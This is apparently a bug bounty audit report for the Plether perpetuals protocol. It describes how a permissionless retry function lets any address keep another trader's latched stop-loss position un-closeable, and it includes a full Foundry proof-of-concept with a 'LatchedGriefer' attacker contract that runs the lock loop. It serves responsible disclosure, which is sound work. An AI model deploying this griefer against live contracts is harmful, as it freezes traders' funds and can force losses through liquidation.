# \#97827 [SC-High] Latched position-protection can be held un-closeable indefinitely by a permissionless, zero-cost retry race

**Submitted on Nov 3rd 2026 at 13:13:31 UTC by @kusanagi0x for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97827
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The permissionless, zero-bounty function `retryPositionProtectionClose` lets **any** address re-open a pending close attempt on **another** trader's `Latched` position protection, consuming the exact state the owner needs for their only remedy (`amendLatchedPositionProtectionCloseLimits`, which requires `Latched` **and** zero pending orders). By bundling the terminalization of the live attempt and a fresh retry into a single transaction each execution window, an attacker denies the owner that window on every block. In production this lets a griefer hold any triggered-and-latched protected position — and the margin locked behind it — un-closeable for as long as they keep paying gas (well beyond 24 hours), with no capital and no bounty at risk; the position can then change only through liquidation.

## Vulnerability Details

The issue is an emergent interaction across `PositionProtectionBook.sol` and `router/OrderLiquidationBatchLogic.sol`. Four facts combine:

**1. A failed/expired close attempt latches, with no attempt counter and no expiry.** When a triggered protection close fails on the trader's own financial limits (or expires unexecuted), `handleFailedProtectionAttempt` (`PositionProtectionBook.sol:637`) sets the protection to `Latched` (`:666`). Nothing bounds how often this can recur.

**2. The retry is permissionless and free.** `retryPositionProtectionClose(uint64 protectionId)` (`PositionProtectionBook.sol:382`) resolves the protection with `_activeProtection(protectionId)` — there is **no `msg.sender`/owner check**:

```solidity
function retryPositionProtectionClose(uint64 protectionId) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);   // no owner gate
    if (protection.status != PositionProtectionStatus.Latched) revert OrderRouter__ProtectionNotLatched();   // :386
    _requireMatchingPosition(protection);
    if (router.pendingOrderCounts(protection.account) != 0) revert OrderRouter__PendingOrdersExist();         // :392
    ...  // commits a fresh ZERO-bounty close attempt on the victim's account
}
```

Any address can call it for any account's latched protection, and it commits a zero-bounty attempt — no capital required.

**3. The owner's only remedy needs the exact state the retry consumes.** `amendLatchedPositionProtectionCloseLimits` (`PositionProtectionBook.sol:315`) is the sole way for the owner to relax unexecutable close limits; it requires `status == Latched` (`:320`) **and** `pendingOrderCounts(msg.sender) == 0` (`:323`). The retry turns the protection into a pending attempt (`pendingOrderCounts == 1`, status leaves `Latched`), so the amend reverts `OrderRouter__ProtectionNotLatched` / `OrderRouter__PendingOrdersExist`.

**4. No other exit exists while the protection is active.**

- `cancelPositionProtection` (`:331`) / internal `_cancel` (`:408`) allow only `PendingOpen`/`Armed` → `OrderRouter__ProtectionNotArmed`.
- A direct close through the public router reverts in `OrderLiquidationBatchLogic._validateFreshRequest`: with an active protection, `OrderRouter__ProtectionActive` (`router/OrderLiquidationBatchLogic.sol:313-314`).
- The atomic exit `cancelPositionProtectionAndCommitClose` requires `status == Armed` → `OrderRouter__ProtectionNotArmed`.

Because the terminalization of the live attempt (`executeOrder`) and the retry are both permissionless and live in different contracts with **no shared guard**, the attacker performs both in a **single transaction**. There is therefore no transaction boundary at which the owner ever observes the `Latched && pendingOrderCounts == 0` state their amend requires.

**Precondition** (natural and attacker-inducible): the protection reaches `Latched` with limits that keep failing — price moving the close notional above `maxExecutionNotionalAssets` (the exact MED-9 scenario), carry exceeding `maxGrossAccountDebitAssets`, or an attacker pushing opposite skew so the VPI charge exceeds `maxActionChargeAssets`.

**Proof of Concept.** A Foundry test on the project's own `BasePerpTest` demonstrates both a control and the attack:

- `test_control_owner_recovers_without_griefer`: with nobody racing, the owner amends in the `Latched` window and the relaxed retry closes the position to zero — proving the recovery window genuinely exists.
- `test_latched_protection_griefing_lock`: a `LatchedGriefer` contract performs `executeOrder + retryPositionProtectionClose` in one transaction; after the first retry and across 8 cycles, every owner exit reverts with its exact selector (amend → `ProtectionNotLatched`/`PendingOrdersExist`; cancel → `ProtectionNotArmed`; manual router close, submitted as the owner → `ProtectionActive`; atomic exit → `ProtectionNotArmed`/`PendingOrdersExist`), the position stays fully open, the protection still locks the account, and the griefer's settlement balance is unchanged (no bounty paid). Both tests pass.

This is not acknowledged in the audit report or `SECURITY.md`; MED-9 only notes that tight close limits "may prevent execution until the owner amends them" — it does not recognise that the amend window can be permanently denied by a third party.

## Impact Details

**Temporary freezing of funds for at least 24 hours.** A permissionless attacker, at gas cost only and with no capital or bounty at risk, can keep any triggered-and-latched protected position un-closeable for as long as they choose. The frozen funds are the trader's position and the margin/collateral locked behind it: while the lock holds, the trader cannot close, cancel, amend, or manually exit, so they cannot realise gains, cut losses, or free the locked margin. The lock is sustained with one transaction per execution window (default ~60 seconds); maintaining it for 24 hours is ~1,440 transactions, and the loop has no upper bound, so the freeze is sustainable well beyond 24 hours for negligible, purely-gas cost. The only thing that can change the position while the lock holds is a liquidation — which, if the market moves against the frozen position, converts the denial-of-service into a realised loss the owner was actively prevented from avoiding. Any trader who uses the protocol's own stop-loss / take-profit protection is a target; the attack scales to many victims in parallel.

## References

- `PositionProtectionBook.sol` — `retryPositionProtectionClose` (permissionless, no owner check): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382
- `PositionProtectionBook.sol` — `amendLatchedPositionProtectionCloseLimits` (owner's only remedy, requires `Latched` + no pending): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315
- `PositionProtectionBook.sol` — `handleFailedProtectionAttempt` sets `Latched`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637
- `router/OrderLiquidationBatchLogic.sol` — `OrderRouter__ProtectionActive` gate: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313
- Audit report MED-9 (tight close limits can block execution until the owner amends) — the owner remedy this report shows can be permanently denied.
- Proof of Concept: `LatchedProtectionGriefPoC.t.sol`

## Proof of Concept


# Proof of Concept — Latched-protection griefing lock

## Setup / environment

The PoC is a Foundry test that extends the project's own harness `packages/perps/test/perps/BasePerpTest.sol`
(mocked Pyth, mock settlement token, no fork — fully deterministic). It is self-contained and reproduces both a
control (owner recovers when nobody races) and the attack (a permissionless griefer holds the position un-closeable).

File: `packages/perps/test/perps/poc/LatchedProtectionGriefPoC.t.sol`

Run:

```
forge test --root packages/perps --match-contract LatchedProtectionGriefPoC -vv
```

Expected result (both tests pass):

```
[PASS] test_control_owner_recovers_without_griefer()
[PASS] test_latched_protection_griefing_lock()
```

## Step-by-step

Actors: `ALICE` (victim), `TRIGGER_KEEPER`, `EXECUTION_KEEPER`, and a permissionless `LatchedGriefer` contract
(any EOA/contract — it holds no special role and posts no capital).

1. **Open a protected position.** ALICE opens a LONG of 100 lots at mark price 1.00 and attaches a stop-loss
   protection at 1.10 with `maxExecutionNotionalAssets = 1e10`. This cap fits at 1.00 (100 lots × 1.00 = 1e10) but
   not at the 1.10 stop (100 × 1.10 = 1.1e10) — the ordinary "price moved, my notional cap is now too tight"
   situation (exactly the MED-9 scenario).

2. **Trigger and latch.** The stop triggers; the close attempt cannot execute within the cap and is left to expire.
   After `executeOrder` on the expired attempt, the protection becomes `Latched` with `pendingOrderCounts(ALICE) == 0`.
   At this instant ALICE's recovery window is open: `amendLatchedPositionProtectionCloseLimits` would succeed.
   (The control test `test_control_owner_recovers_without_griefer` proves exactly this: with nobody racing, ALICE
   amends and the relaxed retry closes her position to zero.)

3. **Griefer takes the window first.** The attacker calls `retryPositionProtectionClose(pid)` — permissionless
   (no `msg.sender`/owner check) and zero-bounty. This re-opens a pending close attempt on ALICE's account, so now
   `pendingOrderCounts(ALICE) == 1` and the protection status leaves `Latched`.

4. **Every owner exit now reverts** (asserted with exact selectors, all called as ALICE):
   - `amendLatchedPositionProtectionCloseLimits` → `OrderRouter__ProtectionNotLatched` / `OrderRouter__PendingOrdersExist`
     (needs `Latched` + no pending — the retry destroyed both).
   - `cancelPositionProtection` → `OrderRouter__ProtectionNotArmed` (a latched/triggered protection is never cancellable).
   - a fully-formed manual close via the public router `commitOrder` → `OrderRouter__ProtectionActive`
     (the protection gate blocks any order while a protection is active).
   - the atomic exit `cancelPositionProtectionAndCommitClose` → `OrderRouter__ProtectionNotArmed` (requires `Armed`).

5. **Sustain the lock indefinitely.** Each execution window the attacker bundles, in a SINGLE transaction,
   `executeOrder(stale attempt)` (terminalizes it → the protection relatches) immediately followed by
   `retryPositionProtectionClose(pid)` (re-opens a fresh pending attempt). Because both calls are permissionless and
   live in different contracts with no shared guard, there is no transaction boundary at which ALICE ever observes
   the `Latched && pendingOrderCounts == 0` state her amend needs. The test runs 8 such cycles and re-asserts the
   full lock after each one; the loop has no upper bound.

6. **Outcome.** After 8 cycles ALICE's position is still fully open (unchanged size), the protection still locks her
   account, and the griefer's settlement balance is unchanged — no bounty paid, no capital risked, only gas spent.
   The only thing that can change ALICE's position while the lock holds is a liquidation. Sustaining the freeze for
   24 hours is ~1,440 single-transaction cycles (one per ~60s execution window), trivially affordable, and the loop
   is unbounded.

## Full test code (paste inline if a PoC code field is required)

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionBook} from "@plether/perps/interfaces/IPositionProtectionBook.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Permissionless griefer: performs the attempt-terminalization and the zero-bounty retry in ONE transaction,
///      so no transaction boundary ever exposes the `Latched && pendingOrderCounts == 0` state the owner needs.
contract LatchedGriefer {
    address public immutable router;
    IPositionProtectionActions public immutable book;

    constructor(address _router, address _book) {
        router = _router;
        book = IPositionProtectionActions(_book);
    }

    /// @notice Expire (or execute-and-fail) the live attempt, then immediately re-open a fresh zero-bounty attempt.
    function cycle(uint64 attemptId, uint64 protectionId, bytes[] calldata data) external returns (uint64 next) {
        (bool ok,) = router.call(abi.encodeWithSignature("executeOrder(uint64,bytes[])", attemptId, data));
        ok; // terminalization result is irrelevant: either way the protection relatches once the attempt is terminal
        next = book.retryPositionProtectionClose(protectionId);
    }

    function retry(uint64 protectionId) external returns (uint64) {
        return book.retryPositionProtectionClose(protectionId);
    }
}

/// @title Latched-protection griefing lock (MED-9/MED-30 interaction) — PoC
/// @notice After a protection close attempt fails on the trader's own financial limits, the protection becomes
///         `Latched`. The ONLY way for the owner to fix unexecutable limits is `amendLatchedPositionProtectionCloseLimits`,
///         which requires `Latched` AND no pending orders. But `retryPositionProtectionClose` is PERMISSIONLESS and
///         zero-bounty, re-opens a pending attempt from `Latched`, and the owner can neither cancel a Latched protection
///         (`_cancel` allows only PendingOpen/Armed) nor commit any manual order (`OrderRouter__ProtectionActive`) nor
///         use the atomic manual exit (Armed only). A griefer who always retries first — trivially, by bundling
///         expire/execute + retry in one tx — therefore holds the trader's position un-closeable for as long as they
///         pay gas (no capital, no bounty). Position changes only via liquidation. Griefing / temporary freezing.
contract LatchedProtectionGriefPoC is BasePerpTest {
    IPositionProtectionBook internal protectionBook;
    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;

    address internal constant ALICE = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant EXECUTION_KEEPER = address(0xE0EC);

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant STOP_LOSS = 110_000_000; // LONG stop-loss at 1.10 (LONG loses as mark rises)
    uint256 internal constant POSITION_SIZE = 10_000e18; // 100 lots
    uint256 internal constant POSITION_MARGIN_ASSETS = 2000e6;
    // Close notional = lots * price. At 1.00 => 100 * 1e8 = 1e10; at the 1.10 stop => 1.1e10. A cap of 1e10 fits at
    // creation but is exceeded at the stop: the ordinary "price moved, my notional cap is now too tight" situation.
    uint256 internal constant NOTIONAL_CAP = 1e10;

    LatchedGriefer internal griefer;

    function setUp() public override {
        super.setUp();
        protectionBook = router.positionProtectionBook();
        protectionActions = IPositionProtectionActions(address(protectionBook));
        protectionViews = IPositionProtectionViews(address(protectionBook));
        griefer = new LatchedGriefer(address(router), address(protectionBook));
        _fundTrader(ALICE, 20_000e6);
        _refreshMark(MARK_PRICE);
    }

    // ---- helpers copied from the project's PositionProtection spec (same mechanics) ----
    function _livePriceData(uint256 price) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refreshMark(uint256 price) internal {
        if (block.timestamp <= engine.lastMarkTime()) vm.warp(uint256(engine.lastMarkTime()) + 1);
        router.updateMarkPrice(_livePriceData(price));
    }

    function _paramsWithCap(uint256 stopLoss, uint256 notionalCap)
        internal pure returns (PositionProtectionTypes.PositionProtectionParams memory p)
    {
        p.takeProfitTriggerPrice = 0;
        p.stopLossTriggerPrice = stopLoss;
        p.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: notionalCap,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _status(uint64 pid) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return protectionViews.getPositionProtection(pid).status;
    }

    function _posSize(address a) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(a);
    }

    function _sel(bytes memory r) internal pure returns (bytes4 x) {
        if (r.length >= 4) assembly { x := mload(add(r, 0x20)) }
    }

    function _relaxed() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory l) {
        l = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    /// @dev A FULLY-FORMED public close request, mirroring the project's own _publicBoundedRequest /
    ///      _manualCloseRequest (PositionProtection.t.sol): fresh client id, valid LONG close target (CAP_PRICE),
    ///      and complete execution bounds. This is deliberate -- the request must clear every *form* check in
    ///      OrderRouter._validateFreshRequest so that whatever stops the owner is the protection/pending LOCK,
    ///      not a malformed order.
    function _closeReq() internal view returns (OrderV3Types.OrderRequest memory req) {
        req.clientOrderId = keccak256(abi.encode("alice-manual-exit", router.nextCommitId()));
        req.side = CfdTypes.Side.LONG;
        req.sizeDelta = POSITION_SIZE;
        req.marginDelta = 0;
        req.targetPrice = engine.CAP_PRICE();
        req.isClose = true;
        req.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    /// @dev Every exit the owner has must revert while the griefer holds the lock — and must revert for the LOCK
    ///      reason (exact error selectors), not because of a malformed call.
    function _assertOwnerLockedOut(uint64 pid, string memory ctx) internal {
        bytes4 got;
        // Build the request BEFORE pranking: _closeReq() makes external view calls that would otherwise consume
        // the vm.prank, so the locked op must run as ALICE, not as this test contract.
        OrderV3Types.OrderRequest memory req = _closeReq();
        // (1) amend the too-tight limits: a live attempt => not Latched (or pending orders exist)
        vm.prank(ALICE);
        try protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _relaxed()) {
            fail(string.concat("owner could amend limits: ", ctx));
        } catch (bytes memory r) { got = _sel(r); }
        assertTrue(
            got == IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector
                || got == IOrderRouterErrors.OrderRouter__PendingOrdersExist.selector,
            string.concat("amend blocked for an unexpected reason: ", ctx)
        );
        // (2) cancel: Latched/Triggered are never cancellable
        vm.prank(ALICE);
        try protectionActions.cancelPositionProtection(pid) {
            fail(string.concat("owner could cancel protection: ", ctx));
        } catch (bytes memory r) { got = _sel(r); }
        assertEq(got, IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector, string.concat("cancel: wrong reason: ", ctx));
        // (3) manual close via the public router. ALICE still holds an ACTIVE position protection, so the
        //     protection gate in OrderRouter._validateFreshRequest reverts OrderRouter__ProtectionActive before a
        //     fully-formed owner close can be queued -- the raw router is not an escape hatch for a protected
        //     position. (Verified: with the WRONG caller the request instead falls through to NoQueuedPosition,
        //     which is why the request is hoisted above to keep the prank on ALICE.)
        vm.prank(ALICE);
        try router.commitOrder(req) {
            fail(string.concat("owner could commit a manual close: ", ctx));
        } catch (bytes memory r) { got = _sel(r); }
        assertEq(got, IOrderRouterErrors.OrderRouter__ProtectionActive.selector, string.concat("manual close: wrong reason: ", ctx));
        // (4) atomic manual exit: Armed only
        vm.prank(ALICE);
        try protectionActions.cancelPositionProtectionAndCommitClose(pid, req) {
            fail(string.concat("owner could use the atomic manual exit: ", ctx));
        } catch (bytes memory r) { got = _sel(r); }
        assertTrue(
            got == IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector
                || got == IOrderRouterErrors.OrderRouter__PendingOrdersExist.selector,
            string.concat("atomic exit blocked for an unexpected reason: ", ctx)
        );
    }

    /// @dev Shared setup: open, protect with a cap that stops fitting at the stop, trigger, expire -> Latched.
    function _setupLatched() internal returns (uint64 pid, uint64 attempt) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        vm.prank(ALICE);
        pid = protectionActions.createPositionProtection(_paramsWithCap(STOP_LOSS, NOTIONAL_CAP));
        _mockPythUpdateData(STOP_LOSS);
        bytes[] memory trig = _livePriceData(STOP_LOSS);
        vm.prank(TRIGGER_KEEPER);
        attempt = protectionActions.triggerPositionProtection(pid, trig);
        uint64 deadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
        vm.warp(uint256(deadline) + 1);
        vm.roll(block.number + 1);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attempt, new bytes[](0));
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "setup: not latched");
        assertEq(router.pendingOrderCounts(ALICE), 0, "setup: pending orders");
    }

    /// @notice CONTROL: with nobody racing, the owner CAN amend in the Latched window and the relaxed retry closes the
    ///         position. This isolates the griefer as the sole cause of the lock in the main test.
    function test_control_owner_recovers_without_griefer() public {
        (uint64 pid,) = _setupLatched();
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _relaxed()); // succeeds: Latched, no pending
        uint64 retryId = protectionActions.retryPositionProtectionClose(pid);
        bytes[] memory data = _mockPythUpdateData(STOP_LOSS);
        vm.roll(uint256(_orderRecord(retryId).core.commitBlock) + 1);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory res = router.executeOrder(retryId, data);
        assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Executed), "relaxed retry should execute");
        assertEq(_posSize(ALICE), 0, "control: position closed once limits were amended");
    }

    function test_latched_protection_griefing_lock() public {
        // 1-3. Open, protect with a cap that fits at 1.00 but not at the 1.10 stop, trigger, let the attempt expire:
        //      protection Latched, no pending orders, position intact (the owner's amend window is open right now).
        (uint64 pid, uint64 attempt) = _setupLatched();
        assertEq(_posSize(ALICE), POSITION_SIZE, "position still open");

        // 4. The griefer takes the window first with a permissionless, zero-bounty retry.
        uint256 grieferBefore = _settlementBalance(address(griefer));
        uint256 aliceBefore = _settlementBalance(ALICE);
        attempt = griefer.retry(pid);
        assertEq(router.pendingOrderCounts(ALICE), 1, "griefer re-opened an attempt on the victim's account");
        _assertOwnerLockedOut(pid, "after griefer's first retry");

        // 5. Lock loop: each cycle the griefer expires the live attempt and retries in ONE tx, so the owner never
        //    observes Latched && no-pending at any transaction boundary. 8 cycles shown; the loop has no upper bound.
        for (uint256 i = 0; i < 8; i++) {
            uint64 deadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(block.number + 1);
            attempt = griefer.cycle(attempt, pid, new bytes[](0));
            assertEq(router.pendingOrderCounts(ALICE), 1, "cycle left a live attempt");
            _assertOwnerLockedOut(pid, "mid-loop");
        }

        // 6. Outcome: position frozen, protection still active, griefer paid no bounty and risked no capital.
        assertEq(_posSize(ALICE), POSITION_SIZE, "FROZEN: victim's position is still open after 8 griefing cycles");
        assertEq(protectionViews.activePositionProtectionId(ALICE), pid, "protection still locks the account");
        assertEq(_settlementBalance(address(griefer)), grieferBefore, "griefer paid/received no bounty");
        assertEq(_settlementBalance(ALICE), aliceBefore, "no settlement moved for the victim");
    }
}
```

